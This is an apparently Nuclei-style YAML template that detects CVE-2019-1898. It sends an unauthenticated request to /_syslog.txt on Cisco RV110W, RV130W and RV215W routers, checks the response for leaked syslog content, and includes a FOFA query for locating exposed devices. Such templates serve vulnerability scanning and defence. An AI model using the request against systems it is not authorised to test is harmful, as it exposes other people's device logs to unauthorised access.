id: CVE-2019-1898

info:
  name: Cisco RV110W RV130W RV215W Router - Information leakage
  author: SleepingBag945
  severity: medium
  description: |
    A vulnerability in the web-based management interface of Cisco RV110W, RV130W, and RV215W Routers could allow an unauthenticated, remote attacker to access the syslog file on an affected device. The vulnerability is due to improper authorization of an HTTP request. An attacker could exploit this vulnerability by accessing the URL for the syslog file. A successful exploit could allow the attacker to access the information contained in the file.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2019-1898
    - https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190619-rv-fileaccess
    - https://www.tenable.com/security/research/tra-2019-29
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
    cvss-score: 5.3
    cwe-id: CWE-425,CWE-285
  metadata:
    fofa-query: icon_hash="-646322113"
    verified: true
    max-request: 1
  tags: cve,cve2019,cisco,router,iot

http:
  - method: POST
    path:
      - '{{BaseURL}}/_syslog.txt'
    headers:
      Content-Type: application/x-www-form-urlencoded

    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200'
          - 'contains(to_lower(body), "ethernet") && contains(to_lower(body), "connection")'
          - 'contains(header, "application/octet-stream")'
        condition: and
